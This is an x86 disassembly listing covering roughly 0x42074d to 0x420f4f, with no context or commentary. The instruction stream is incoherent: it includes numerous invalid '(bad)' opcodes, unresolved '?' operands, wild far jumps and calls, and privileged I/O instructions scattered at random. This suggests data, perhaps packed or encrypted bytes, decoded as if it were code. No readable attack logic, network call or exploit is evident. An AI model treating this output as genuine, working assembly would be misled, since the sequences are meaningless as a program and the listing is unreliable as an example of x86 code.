  42074d:	push   ss
  42074e:	scas   eax,DWORD PTR es:[edi]
  42074f:	retf   
  420750:	pushf  
  420751:	xor    al,0xaf
  420753:	push   edx
  420754:	lea    esp,[eax+0x5e]
  420757:	add    eax,0x70f33e46
  42075c:	jno    0x420713
  42075e:	leave  
  42075f:	iret   
  420760:	mov    bh,0x84
  420762:	(bad)  
  420763:	leave  
  420764:	mov    eax,ds:0x620b4435
  420769:	pop    edx
  42076a:	fwait
  42076b:	mov    edx,0x5dc39d94
  420770:	dec    eax
  420771:	add    ecx,DWORD PTR [ebx+0x59]
  420774:	ss jb  0x420795
  420777:	sti    
  420778:	pop    ds
  420779:	mov    ds:0x75364c4,eax
  42077e:	scas   eax,DWORD PTR es:[edi]
  42077f:	xor    eax,0x827bdfd8
  420784:	cmp    ah,BYTE PTR [esi]
  420786:	adc    ebp,eax
  420788:	jmp    0x537ba64b
  42078d:	rol    BYTE PTR [esi+0x45],0x91
  420791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420792:	push   es
  420793:	test   BYTE PTR [ebx],dl
  420795:	inc    edi
  420796:	bound  esi,QWORD PTR ds:0xf42e1935
  42079c:	into   
  42079d:	lea    edx,[ebx+ebx*2-0x2b]
  4207a1:	(bad)  [edx+0x69]
  4207a4:	fld    TBYTE PTR [edx-0x2b0a8491]
  4207aa:	ja     0x420781
  4207ac:	pop    ebp
  4207ad:	mov    ecx,0xce39afee
  4207b2:	aaa    
  4207b3:	lods   eax,DWORD PTR ds:[esi]
  4207b4:	js     0x420780
  4207b6:	jl     0x420758
  4207b8:	in     eax,dx
  4207b9:	push   edx
  4207ba:	add    edi,ebp
  4207bc:	fbld   TBYTE PTR [edi*2-0x21804cc7]
  4207c3:	int    0x1d
  4207c5:	pop    ds
  4207c6:	out    dx,al
  4207c7:	(bad)  
  4207c8:	out    dx,al
  4207c9:	sub    DWORD PTR [ecx-0x7876220f],edx
  4207cf:	in     al,dx
  4207d0:	shl    BYTE PTR [ecx],1
  4207d2:	inc    edx
  4207d3:	sbb    al,0x3e
  4207d5:	push   es
  4207d6:	enter  0xf9b1,0xf1
  4207da:	dec    esp
  4207db:	jle    0x42084b
  4207dd:	xor    esp,0xca98a3b4
  4207e3:	sahf   
  4207e4:	cdq    
  4207e5:	inc    esi
  4207e6:	jmp    0x3ed85362
  4207eb:	or     eax,0x2067dc38
  4207f0:	imul   esi,DWORD PTR [eax+0x42],0x63540dd2
  4207f7:	in     al,0x83
  4207f9:	xor    al,0x65
  4207fb:	aam    0x17
  4207fd:	jae    0x420812
  4207ff:	cld    
  420800:	sub    al,0xfe
  420802:	mov    BYTE PTR [ebp-0x3ee2f1fa],ch
  420808:	(bad)  
  420809:	lock icebp 
  42080b:	jl     0x42079e
  42080d:	popf   
  42080e:	dec    edx
  42080f:	out    dx,eax
  420810:	mov    ch,0xa
  420812:	mov    ebp,0xd737618b
  420817:	mov    eax,0xc8b68212
  42081c:	push   eax
  42081d:	push   0x91e7de15
  420822:	pop    ebx
  420823:	dec    eax
  420824:	or     dl,BYTE PTR [eax]
  420826:	xor    al,0x76
  420828:	loop   0x420806
  42082a:	sub    BYTE PTR [ebp-0xd],bl
  42082d:	dec    edx
  42082e:	push   edi
  42082f:	sub    ch,BYTE PTR [ecx+0x60f51f74]
  420835:	mov    dh,0x23
  420837:	mov    ah,0x4d
  420839:	mov    edx,0x2205968a
  42083e:	scas   al,BYTE PTR es:[edi]
  42083f:	xchg   ebx,eax
  420840:	mul    DWORD PTR [edi+0x54]
  420843:	jp     0x420885
  420845:	inc    ecx
  420846:	jmp    0xcecd:0x9010b801
  42084d:	inc    esi
  42084e:	push   es
  42084f:	adc    edx,eax
  420851:	jp     0x42083d
  420853:	ror    BYTE PTR [edx],1
  420855:	in     al,dx
  420856:	ds sbb al,0x7e
  420859:	(bad)  
  42085a:	imul   ebp,DWORD PTR [eax+edi*4+0x7c150b7b],0x18
  420862:	xchg   edx,eax
  420863:	mov    al,ds:0x7d2ef681
  420868:	push   cs
  420869:	mov    al,0xb4
  42086b:	cmp    BYTE PTR [ecx-0x22],0x13
  42086f:	xchg   edi,eax
  420870:	lea    esp,[esi]
  420872:	xor    DWORD PTR ds:0x85826b00,edi
  420878:	stos   BYTE PTR es:[edi],al
  420879:	je     0x420855
  42087b:	out    dx,eax
  42087c:	sub    esp,edx
  42087e:	dec    edx
  42087f:	push   cs
  420880:	pop    es
  420881:	mov    ds:0x66e47871,eax
  420886:	leave  
  420887:	and    esi,DWORD PTR ds:0x6c9d1126
  42088d:	lds    esp,FWORD PTR [ebp+0x6f83c05a]
  420893:	xchg   ecx,eax
  420894:	stc    
  420895:	sbb    eax,0xd834c42f
  42089a:	or     esp,DWORD PTR [ebp-0x653ca3bb]
  4208a0:	ds ja  0x420869
  4208a3:	scas   eax,DWORD PTR es:[edi]
  4208a4:	es mov eax,0xcb6e34e4
  4208aa:	mov    BYTE PTR [ecx+0x555405a9],ah
  4208b0:	pop    ebp
  4208b1:	xchg   edi,eax
  4208b2:	xlat   BYTE PTR ds:[ebx]
  4208b3:	push   0xffffffdb
  4208b5:	or     al,0xec
  4208b7:	outs   dx,DWORD PTR ds:[esi]
  4208b8:	add    ebx,ebx
  4208ba:	push   ss
  4208bb:	and    eax,0xf1e8d75c
  4208c0:	ins    BYTE PTR es:[edi],dx
  4208c1:	sbb    bh,BYTE PTR ds:0x5eb64fcd
  4208c7:	pop    eax
  4208c8:	sub    eax,edx
  4208ca:	dec    ecx
  4208cb:	jecxz  0x42086b
  4208cd:	xor    DWORD PTR [edi+esi*8-0x78],eax
  4208d1:	xlat   BYTE PTR ds:[ebx]
  4208d2:	es cmp eax,0x4bdc07c
  4208d8:	xchg   esp,eax
  4208d9:	xor    al,0xf3
  4208db:	sub    BYTE PTR [ebx],dl
  4208dd:	lea    ecx,[esi+0x23abd699]
  4208e3:	xlat   BYTE PTR ds:[ebx]
  4208e4:	test   al,0x38
  4208e6:	inc    ecx
  4208e7:	pop    es
  4208e8:	out    dx,eax
  4208e9:	in     al,0x32
  4208eb:	test   BYTE PTR [ecx-0x347215f9],dh
  4208f1:	pop    esp
  4208f2:	scas   al,BYTE PTR es:[edi]
  4208f3:	adc    BYTE PTR [ebp+0x63f5eca5],al
  4208f9:	inc    eax
  4208fa:	cdq    
  4208fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208fc:	popa   
  4208fd:	dec    ebp
  4208fe:	stos   DWORD PTR es:[edi],eax
  4208ff:	or     al,BYTE PTR [eax+0x12]
  420902:	pop    eax
  420903:	pop    edx
  420904:	pop    ecx
  420905:	outs   dx,DWORD PTR ds:[esi]
  420906:	pop    es
  420907:	arpl   sp,dx
  420909:	fisub  DWORD PTR [ecx+0x0]
  42090c:	fstp   TBYTE PTR cs:[ecx]
  42090f:	int3   
  420910:	test   eax,0x6da1477c
  420915:	loope  0x4208d8
  420917:	inc    ebp
  420918:	or     BYTE PTR [eax],al
  42091a:	cwde   
  42091b:	jmp    0x4208c2
  42091d:	in     eax,dx
  42091e:	fmul   QWORD PTR [ebp+ebp*2+0x12]
  420922:	cwde   
  420923:	out    0x7b,al
  420925:	ja     0x42091d
  420927:	inc    edi
  420928:	loopne 0x420973
  42092a:	(bad)  
  42092b:	jbe    0x420993
  42092d:	cli    
  42092e:	cld    
  42092f:	adc    al,0x37
  420931:	sti    
  420932:	sar    DWORD PTR [esi+0x11c864bb],0x22
  420939:	push   esi
  42093a:	repz out dx,eax
  42093c:	enter  0xb931,0xea
  420940:	icebp  
  420941:	fld    DWORD PTR [esi-0x5bd28e6b]
  420947:	inc    esi
  420948:	mov    ebx,0xe3dbcd1b
  42094d:	jecxz  0x420962
  42094f:	(bad)  
  420950:	into   
  420951:	jb     0x4209ce
  420953:	in     al,0xfd
  420955:	adc    DWORD PTR fs:[edi-0xe],0x2d
  42095a:	leave  
  42095b:	test   DWORD PTR [ecx],ebp
  42095d:	neg    DWORD PTR ds:0x3c36bbd4
  420963:	jge    0x420975
  420965:	sub    ebx,eax
  420967:	repnz push ebp
  420969:	fidiv  DWORD PTR ds:0x1561f008
  42096f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420970:	shr    BYTE PTR [ebx+0x5fde48d8],1
  420976:	out    0x87,al
  420978:	add    eax,ebp
  42097a:	neg    BYTE PTR [edi-0x3f]
  42097d:	sub    edx,edx
  42097f:	aad    0x1d
  420981:	cmp    ecx,DWORD PTR [eax-0x21095403]
  420987:	aas    
  420988:	xlat   BYTE PTR ds:[ebx]
  420989:	sar    edi,cl
  42098b:	and    eax,0x16534325
  420990:	jo     0x42094a
  420992:	sbb    al,0x13
  420994:	xchg   edx,eax
  420995:	xchg   ecx,eax
  420996:	ret    
  420997:	push   esp
  420998:	mov    ?,esp
  42099a:	out    dx,eax
  42099b:	add    ebx,DWORD PTR [eax+0x243fb251]
  4209a1:	mov    ebx,0x790e82c4
  4209a6:	add    ebx,DWORD PTR [edi+0xc5164cc]
  4209ac:	aaa    
  4209ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ae:	adc    DWORD PTR [eax+0xba92752],esi
  4209b4:	retf   0xf411
  4209b7:	ror    DWORD PTR [esi+0x78],cl
  4209ba:	lock pop esi
  4209bc:	cli    
  4209bd:	adc    DWORD PTR [eax-0x4d],ebp
  4209c0:	inc    esi
  4209c1:	outs   dx,BYTE PTR ds:[esi]
  4209c2:	ins    DWORD PTR es:[edi],dx
  4209c3:	cmc    
  4209c4:	mov    ds:0x3efa16d7,al
  4209c9:	cdq    
  4209ca:	(bad)  [ebx-0x10]
  4209cd:	loopne 0x420984
  4209cf:	inc    edi
  4209d0:	xchg   ebp,eax
  4209d1:	and    bh,BYTE PTR [ebx+0x223f41c6]
  4209d7:	nop
  4209d8:	add    al,0x7b
  4209da:	jb     0x4209c4
  4209dc:	pop    esp
  4209dd:	sbb    dl,BYTE PTR [edx]
  4209df:	sbb    eax,0x5d72764d
  4209e4:	mov    ecx,0xc1ddaf88
  4209e9:	mov    eax,0xe1c36d8d
  4209ee:	out    dx,al
  4209ef:	std    
  4209f0:	out    dx,eax
  4209f1:	mov    cl,BYTE PTR [eax]
  4209f3:	shl    DWORD PTR [ecx+0x1ea8408b],0x39
  4209fa:	mov    edx,0x17c5a8a9
  4209ff:	inc    esp
  420a00:	xchg   edx,eax
  420a01:	dec    esi
  420a02:	mov    cl,0x94
  420a04:	int    0x8f
  420a06:	inc    esp
  420a07:	sar    BYTE PTR [ebx-0x3a],cl
  420a0a:	dec    esp
  420a0b:	and    al,0xba
  420a0d:	cmc    
  420a0e:	add    BYTE PTR [ecx],dl
  420a10:	fldz   
  420a12:	jnp    0x420a54
  420a14:	mov    BYTE PTR [ecx+edx*1-0x15c9426],bl
  420a1b:	mov    ch,0xa2
  420a1d:	ss aad 0xb4
  420a20:	jmp    0xef1a:0x88820086
  420a27:	sub    BYTE PTR [ebx],cl
  420a29:	cmp    eax,0xbb7e1718
  420a2e:	repnz xor ah,BYTE PTR ss:[eax-0x3d]
  420a33:	dec    ebp
  420a34:	jo     0x4209fe
  420a36:	add    cl,BYTE PTR [ebx+0x608402bf]
  420a3c:	xchg   BYTE PTR [ebx],dl
  420a3e:	jb     0x420a6b
  420a40:	push   ds
  420a41:	imul   edi,DWORD PTR [ebx+0x3a],0xbbdee785
  420a48:	xor    BYTE PTR [eax+eiz*1-0x37],bh
  420a4c:	in     eax,0x6e
  420a4e:	mov    esi,0x6ae38ede
  420a53:	push   0x54
  420a55:	loop   0x420a4d
  420a57:	clc    
  420a58:	inc    edx
  420a59:	and    ch,0xea
  420a5c:	loope  0x420a26
  420a5e:	add    eax,0xb683da40
  420a63:	mov    esi,0xbcdbef39
  420a68:	call   0x413230a6
  420a6d:	fs pop esp
  420a6f:	add    eax,0x7b018988
  420a74:	jmp    0x8e6e4327
  420a79:	les    ebx,FWORD PTR [ebx+0x8]
  420a7c:	(bad)  
  420a7d:	sbb    ebp,ebp
  420a7f:	dec    ebx
  420a80:	repnz add esi,DWORD PTR [ebx-0x36]
  420a84:	sbb    bh,BYTE PTR [edi-0x6d3288d5]
  420a8a:	in     al,0x55
  420a8c:	cmp    esi,DWORD PTR [edx+0x5b]
  420a8f:	mov    ebp,0x53e55cdf
  420a94:	and    ebp,DWORD PTR [esi]
  420a96:	shr    BYTE PTR ds:0xa10aa2d3,cl
  420a9c:	vmwrite ecx,DWORD PTR [eax]
  420a9f:	lds    edx,FWORD PTR ds:0x60c69fdf
  420aa5:	into   
  420aa6:	and    dl,0x3b
  420aa9:	js     0x420b1c
  420aab:	mov    eax,ds:0x745b9908
  420ab0:	fisub  DWORD PTR [ebp+0x6d41b3da]
  420ab6:	or     cl,BYTE PTR [ebp+0x18717af0]
  420abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420abd:	stc    
  420abe:	rcr    edi,cl
  420ac0:	xor    DWORD PTR [edi+0x51fa4f68],ebp
  420ac6:	mov    ?,WORD PTR [eax+0x61]
  420ac9:	out    dx,al
  420aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420acb:	in     eax,0xf6
  420acd:	mov    edi,0x72ee448f
  420ad2:	lods   eax,DWORD PTR ds:[esi]
  420ad3:	xor    eax,0x96c8306c
  420ad8:	jne    0x420ab5
  420ada:	aam    0x8
  420adc:	xchg   edi,eax
  420add:	inc    edi
  420ade:	inc    eax
  420adf:	shr    eax,0xdd
  420ae2:	mov    bh,0xd6
  420ae4:	jmp    0x8507:0xbb539b63
  420aeb:	lock int 0x69
  420aee:	pop    ecx
  420aef:	icebp  
  420af0:	ror    BYTE PTR [edx+edx*8],0x14
  420af4:	pusha  
  420af5:	outs   dx,BYTE PTR ds:[esi]
  420af6:	dec    ebp
  420af7:	das    
  420af8:	std    
  420af9:	in     eax,dx
  420afa:	dec    eax
  420afb:	mov    dh,0x90
  420afd:	scas   al,BYTE PTR es:[edi]
  420afe:	xor    BYTE PTR [eax],al
  420b00:	sub    bh,BYTE PTR [esi+0x1c]
  420b03:	lods   al,BYTE PTR ds:[esi]
  420b04:	inc    esp
  420b05:	mov    bh,BYTE PTR [edi+eax*2-0x7a40f34c]
  420b0c:	cld    
  420b0d:	sub    eax,0xf89b3c81
  420b12:	repnz inc ecx
  420b14:	mov    al,ds:0x2576da5e
  420b19:	js     0x420b03
  420b1b:	pop    es
  420b1c:	cwde   
  420b1d:	loopne 0x420b6a
  420b1f:	inc    esi
  420b20:	mov    ebp,0x4cdca147
  420b25:	dec    edx
  420b26:	sbb    BYTE PTR [edi-0x43],cl
  420b29:	outs   dx,BYTE PTR ds:[esi]
  420b2a:	adc    BYTE PTR [edx],dh
  420b2c:	inc    esp
  420b2d:	xchg   edi,eax
  420b2e:	imul   ebp,DWORD PTR [esi],0xffffffc5
  420b31:	mov    ebx,0x1356ed21
  420b36:	test   eax,0x20d49f1c
  420b3b:	xchg   DWORD PTR [eax+ebp*8+0x39449c44],eax
  420b42:	push   edx
  420b43:	dec    ebp
  420b44:	push   es
  420b45:	add    ebp,ecx
  420b47:	lea    edi,[eax]
  420b49:	pop    ds
  420b4a:	push   ds
  420b4b:	int3   
  420b4c:	xor    al,0x58
  420b4e:	test   al,0x3b
  420b50:	xlat   BYTE PTR ds:[ebx]
  420b51:	popf   
  420b52:	add    dl,BYTE PTR [ebp+0x270111df]
  420b58:	mov    esi,DWORD PTR [ebx+eax*4]
  420b5b:	adc    esi,DWORD PTR [ebx]
  420b5d:	pop    ecx
  420b5e:	xor    eax,0xf5411db6
  420b63:	cld    
  420b64:	lods   al,BYTE PTR ds:[esi]
  420b65:	push   ds
  420b66:	dec    esi
  420b67:	(bad)  
  420b68:	xchg   edi,eax
  420b69:	ds rcl bl,1
  420b6c:	adc    bl,al
  420b6e:	push   ebp
  420b6f:	push   ss
  420b70:	xor    DWORD PTR [edi+ecx*1-0x35a3aaba],edx
  420b77:	push   edx
  420b78:	mov    esi,0x7bd25c8
  420b7d:	jg     0x420b96
  420b7f:	dec    ebx
  420b80:	mov    ds:0x9b7d7e64,al
  420b85:	in     eax,0xbb
  420b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b88:	stos   DWORD PTR es:[edi],eax
  420b89:	pop    edx
  420b8a:	fs cdq 
  420b8c:	ss push edx
  420b8e:	in     al,0x63
  420b90:	and    dh,BYTE PTR ds:0xef8193aa
  420b96:	pop    ecx
  420b97:	xchg   edi,eax
  420b98:	das    
  420b99:	and    al,0x3
  420b9b:	xchg   BYTE PTR ds:0x72d4fda8,ah
  420ba1:	sti    
  420ba2:	sbb    al,0x27
  420ba4:	or     ah,cl
  420ba6:	or     eax,DWORD PTR [eax-0x38]
  420ba9:	test   eax,0xb93614c5
  420bae:	inc    esp
  420baf:	(bad)  
  420bb0:	ss xor ebx,ebp
  420bb3:	fld    DWORD PTR [edx]
  420bb5:	loope  0x420bd0
  420bb7:	pop    edi
  420bb8:	imul   edi,DWORD PTR ds:0x8dedf77a,0xb4189b1e
  420bc2:	adc    BYTE PTR [ebx],ah
  420bc4:	dec    ecx
  420bc5:	xchg   esi,eax
  420bc6:	or     al,BYTE PTR [ebp+0x7f380a44]
  420bcc:	repnz out 0xed,al
  420bcf:	test   eax,0x2190fa6d
  420bd4:	mov    dh,0x45
  420bd6:	stos   BYTE PTR es:[edi],al
  420bd7:	mov    edx,ecx
  420bd9:	mov    eax,0x92b03880
  420bde:	out    dx,eax
  420bdf:	(bad)  
  420be0:	mov    ch,0x66
  420be2:	mov    ebp,0xf9cd7691
  420be7:	rcl    BYTE PTR fs:[eax-0x652ae507],cl
  420bee:	mov    eax,0xb8790dc
  420bf3:	shl    dh,cl
  420bf5:	sub    DWORD PTR [ecx+0x569c580c],0xd7a1f427
  420bff:	int3   
  420c00:	push   ebp
  420c01:	and    bl,dl
  420c03:	pop    ebp
  420c04:	jp     0x420bd8
  420c06:	enter  0xa448,0x3c
  420c0a:	mov    ds:0xc69a1507,eax
  420c0f:	cld    
  420c10:	and    DWORD PTR [ebp-0x55],edi
  420c13:	ret    
  420c14:	orps   xmm0,xmm0
  420c17:	or     bl,BYTE PTR [ecx-0x71]
  420c1a:	sub    esi,DWORD PTR [edi-0x2fae1964]
  420c20:	loope  0x420bcf
  420c22:	pop    ecx
  420c23:	push   edi
  420c24:	inc    ebx
  420c25:	ficomp WORD PTR [edx-0x6e]
  420c28:	jnp    0x420c32
  420c2a:	pushf  
  420c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c2c:	leave  
  420c2d:	loop   0x420c39
  420c2f:	out    0x1,al
  420c31:	or     DWORD PTR [edx-0x1],edx
  420c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c35:	fldenv [ebp+0x1a]
  420c38:	xchg   esp,eax
  420c39:	aad    0x9c
  420c3b:	jl     0x420c10
  420c3d:	retf   
  420c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c3f:	aad    0x88
  420c41:	sbb    al,0xe5
  420c43:	cld    
  420c44:	stos   DWORD PTR es:[edi],eax
  420c45:	cmp    DWORD PTR [edx+0xbfbef6f],esp
  420c4b:	shr    BYTE PTR [eax+0x1b],0xd0
  420c4f:	push   cs
  420c50:	dec    esp
  420c51:	pop    ebx
  420c52:	sbb    edx,DWORD PTR [eax+0x976fb99]
  420c58:	in     eax,dx
  420c59:	mov    al,ds:0x738d5ba3
  420c5e:	loop   0x420c24
  420c60:	rol    DWORD PTR [ebp-0x421b4f5e],1
  420c66:	mov    WORD PTR [esi+ecx*1],?
  420c69:	mov    esi,0x418b3a67
  420c6e:	cs push ecx
  420c70:	push   es
  420c71:	sub    BYTE PTR ds:0xd215aae1,dh
  420c77:	pop    edx
  420c78:	sbb    al,0x5a
  420c7a:	mov    cl,0x3f
  420c7c:	or     eax,0x8b50802d
  420c81:	cmc    
  420c82:	or     al,0x95
  420c84:	pop    ebx
  420c85:	sub    al,BYTE PTR [ebp-0x77]
  420c88:	sbb    dh,dh
  420c8a:	mov    ecx,0xdfc4a5ae
  420c8f:	pop    edi
  420c90:	xlat   BYTE PTR ds:[ebx]
  420c91:	push   0xf02d4010
  420c96:	add    eax,0xb9fcf801
  420c9b:	push   eax
  420c9c:	push   ebx
  420c9d:	call   0x11e82c44
  420ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ca3:	cmp    eax,0x54bb1be5
  420ca8:	pop    es
  420ca9:	jo     0x420cf1
  420cab:	fstp   TBYTE PTR [ecx]
  420cad:	out    dx,eax
  420cae:	add    DWORD PTR [ebp+0x5d],esi
  420cb1:	mov    ecx,0xa19086da
  420cb6:	repnz push ds
  420cb8:	dec    edx
  420cb9:	nop
  420cba:	aas    
  420cbb:	sbb    BYTE PTR [eax],bl
  420cbd:	jo     0x420c42
  420cbf:	inc    ebp
  420cc0:	dec    esp
  420cc1:	out    dx,eax
  420cc2:	jl     0x420cb4
  420cc4:	sub    eax,0x8becfd92
  420cc9:	jnp    0x420c87
  420ccb:	retf   0xfd5d
  420cce:	sub    bl,BYTE PTR [edi-0x15]
  420cd1:	or     eax,0x5043b383
  420cd6:	jo     0x420c70
  420cd8:	and    eax,DWORD PTR [ebp-0x11485455]
  420cde:	mov    edi,0xd0fdee69
  420ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ce4:	mov    ebp,0xf8b9943
  420ce9:	js     0x420cf6
  420ceb:	pop    ebp
  420cec:	mov    ah,0xa4
  420cee:	sar    BYTE PTR [esi+esi*2],cl
  420cf1:	ja     0x420d35
  420cf3:	inc    edi
  420cf4:	dec    ebp
  420cf5:	adc    DWORD PTR [esp+edi*4-0x64],0xffffffd1
  420cfa:	out    0x1c,eax
  420cfc:	push   ebx
  420cfd:	ja     0x420d3e
  420cff:	mov    al,0xfb
  420d01:	test   eax,0xabab039b
  420d07:	push   0x3b71482e
  420d0c:	sub    eax,0x2d29a360
  420d11:	(bad)  
  420d12:	mov    esp,0x2df91220
  420d17:	mov    edi,0xb06ae46f
  420d1c:	call   0xbaaa:0xbe0071db
  420d23:	nop
  420d24:	push   es
  420d25:	daa    
  420d26:	call   0x79a35891
  420d2b:	loop   0x420cd9
  420d2d:	mov    ah,0x31
  420d2f:	xchg   ebp,eax
  420d30:	pushf  
  420d31:	fld    DWORD PTR [eax]
  420d33:	sub    DWORD PTR [esi-0x70],esi
  420d36:	adc    BYTE PTR ss:[ebp+ecx*4+0x765ec0],cl
  420d3e:	ins    DWORD PTR es:[edi],dx
  420d3f:	jae    0x420d85
  420d41:	fiadd  DWORD PTR [ebx]
  420d43:	lahf   
  420d44:	popa   
  420d45:	mov    BYTE PTR [esi-0x6c9e490f],ch
  420d4b:	ss push esi
  420d4d:	mov    ebx,0xaf1d785e
  420d52:	out    dx,al
  420d53:	sub    BYTE PTR [eax-0x3a],bh
  420d56:	push   0xeaa5e8b6
  420d5b:	int3   
  420d5c:	mov    ds:0x22c75d44,al
  420d61:	and    edx,DWORD PTR [esi]
  420d63:	test   DWORD PTR [eax],ebp
  420d65:	je     0x420d02
  420d67:	cmp    eax,0x776df7a9
  420d6c:	mov    ah,0xe3
  420d6e:	cld    
  420d6f:	xor    eax,0xeff64314
  420d74:	mov    ah,0xea
  420d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d77:	pop    eax
  420d78:	dec    edi
  420d79:	das    
  420d7a:	popa   
  420d7b:	hlt    
  420d7c:	ficomp WORD PTR [esi+0x41f2ed81]
  420d82:	mov    ecx,ebp
  420d84:	and    DWORD PTR [edi+0x16816718],edi
  420d8a:	fwait
  420d8b:	out    0x49,eax
  420d8d:	aas    
  420d8e:	repz cmp eax,0x9a34ea7d
  420d94:	cwde   
  420d95:	push   ebp
  420d96:	and    esi,DWORD PTR [ecx-0x71f28813]
  420d9c:	adc    al,0x44
  420d9e:	push   ebx
  420d9f:	or     edx,esp
  420da1:	and    al,0xb6
  420da3:	repnz inc esi
  420da5:	xchg   esp,eax
  420da6:	jg     0x420d4f
  420da8:	fadd   DWORD PTR [ecx-0x56]
  420dab:	ja     0x420dd4
  420dad:	pop    esi
  420dae:	dec    ecx
  420daf:	inc    eax
  420db0:	aaa    
  420db1:	jbe    0x420d39
  420db3:	mov    eax,ds:0x997c3ebb
  420db8:	cwde   
  420db9:	sahf   
  420dba:	(bad)  
  420dbb:	fiadd  WORD PTR [ecx-0x7c]
  420dbe:	pop    eax
  420dbf:	fdiv   DWORD PTR [ebx+edi*2-0x22]
  420dc3:	shl    DWORD PTR [edi+eiz*2],cl
  420dc6:	sub    al,0x74
  420dc8:	into   
  420dc9:	mov    ecx,0xca517d75
  420dce:	mov    ds:0x31c8ccb4,al
  420dd3:	retf   
  420dd4:	sbb    DWORD PTR [eax+edi*4-0x747d08a4],edi
  420ddb:	inc    esp
  420ddc:	mov    bl,BYTE PTR [edi+0x54]
  420ddf:	cmp    al,0x8e
  420de1:	adc    eax,0xe69903b2
  420de6:	add    bl,BYTE PTR [ebx-0x4642f0cc]
  420dec:	fisub  DWORD PTR [esi-0x8]
  420def:	and    eax,0x35e7d65c
  420df4:	sub    dh,dl
  420df6:	mov    dl,0xe3
  420df8:	adc    al,0xa3
  420dfa:	sub    eax,0x803d15c6
  420dff:	test   cl,ah
  420e01:	shl    ebx,0xd7
  420e04:	adc    al,0x5f
  420e06:	bound  edx,QWORD PTR [eax]
  420e08:	lods   eax,DWORD PTR ds:[esi]
  420e09:	loopne 0x420dc8
  420e0b:	dec    ecx
  420e0c:	sbb    eax,0xf8be7574
  420e11:	mov    cl,0x79
  420e13:	test   al,0xb5
  420e15:	sbb    BYTE PTR [ebx-0x56],al
  420e18:	or     al,0xcd
  420e1a:	stos   BYTE PTR es:[edi],al
  420e1b:	mov    esp,0x93eb184a
  420e20:	dec    edi
  420e21:	and    al,0xcb
  420e24:	imul   ecx,DWORD PTR es:[ecx-0x6d],0xffffffe8
  420e29:	xchg   DWORD PTR [esp+ebx*4+0x69a6dcd8],ecx
  420e30:	cdq    
  420e31:	scas   eax,DWORD PTR es:[edi]
  420e32:	lds    esp,FWORD PTR [edi]
  420e34:	mov    ecx,0x8e17aee4
  420e39:	lods   al,BYTE PTR ds:[esi]
  420e3a:	call   0x1462:0xdc3e2bba
  420e41:	push   0x17
  420e43:	std    
  420e44:	sub    eax,0xfdd2c59a
  420e49:	jns    0x420ead
  420e4b:	sub    BYTE PTR [ebx-0x16c5a252],bh
  420e51:	cmc    
  420e52:	sti    
  420e53:	sbb    BYTE PTR [eax+esi*2-0x1c],ch
  420e57:	repz leave 
  420e59:	push   0xffffffbc
  420e5b:	pop    edx
  420e5c:	ja     0x420ed6
  420e5e:	ja     0x420e37
  420e60:	xor    ebp,DWORD PTR [edi]
  420e62:	jmp    0x84498703
  420e67:	js     0x420ee1
  420e69:	mov    dh,BYTE PTR [ebx+0x54c358df]
  420e6f:	repnz fsubr QWORD PTR [edx+0x28b10560]
  420e76:	fnstenv [edi]
  420e78:	inc    ebx
  420e79:	(bad)  
  420e7b:	gs retf 0x6566
  420e7f:	mov    ebx,0x7aca2a38
  420e84:	sar    BYTE PTR [edx],cl
  420e86:	or     eax,0x58eadca7
  420e8b:	rcr    bl,cl
  420e8d:	pusha  
  420e8e:	mov    edi,0xb2b3a40c
  420e93:	imul   esp,DWORD PTR [edi+0x13],0xac615a02
  420e9a:	popf   
  420e9b:	add    eax,0xca5b42f
  420ea0:	fdivr  st(2),st
  420ea2:	cwde   
  420ea3:	push   ds
  420ea4:	push   edx
  420ea5:	imul   ecx,DWORD PTR [edi-0x5c44915f],0xffffff9f
  420eac:	imul   edi,eax,0x8248786a
  420eb2:	adc    DWORD PTR [edx+0x51ebb971],0x2b
  420eb9:	shr    ecx,0x9d
  420ebc:	leave  
  420ebd:	lock arpl sp,dx
  420ec0:	fist   DWORD PTR [edx+0x7e]
  420ec3:	test   BYTE PTR [esi-0x30441de7],bl
  420ec9:	mov    ebx,0x98032545
  420ece:	dec    edx
  420ecf:	or     al,0xbb
  420ed1:	jae    0x420e99
  420ed3:	add    bl,al
  420ed5:	add    cl,ch
  420ed7:	xor    ecx,DWORD PTR [ecx-0x108dd5dc]
  420edd:	jae    0x420f2d
  420edf:	sub    dl,BYTE PTR ds:0x238f7027
  420ee5:	imul   edx,DWORD PTR [edx+0x26f0c51],0x52
  420eec:	pop    esi
  420eed:	mov    edi,0xab9b3418
  420ef2:	xchg   DWORD PTR [ecx-0x271b5488],edx
  420ef8:	mov    esp,0xa646aa9c
  420efd:	sub    DWORD PTR [esi-0x21],esp
  420f00:	shl    DWORD PTR [ebp+0x2d],cl
  420f03:	clc    
  420f04:	ins    DWORD PTR es:[edi],dx
  420f05:	mov    ecx,0x1bcce7e7
  420f0a:	loope  0x420ea8
  420f0c:	mov    cl,0x1f
  420f0e:	fisubr DWORD PTR [esi+eiz*1]
  420f11:	sti    
  420f12:	jae    0x420ebe
  420f14:	outs   dx,DWORD PTR ds:[esi]
  420f15:	jmp    0xc311:0xc470fc8
  420f1c:	jge    0x420ea7
  420f1e:	push   DWORD PTR [esi+0x16]
  420f21:	mov    ds:0xfd233dce,al
  420f26:	loope  0x420f51
  420f28:	lahf   
  420f29:	and    eax,0xa8c0f8e
  420f2e:	test   eax,0x732acf65
  420f33:	(bad)  
  420f34:	bnd jmp 0x420ed1
  420f37:	mov    WORD PTR [ecx+0x1731863c],cs
  420f3d:	loope  0x420fba
  420f3f:	dec    ebp
  420f40:	and    DWORD PTR [ecx],edi
  420f42:	mov    ss,WORD PTR [ebp-0x10]
  420f45:	test   DWORD PTR ds:0xb93831dc,0xbc4f7db5
  420f4f:	jl     0x420fa8
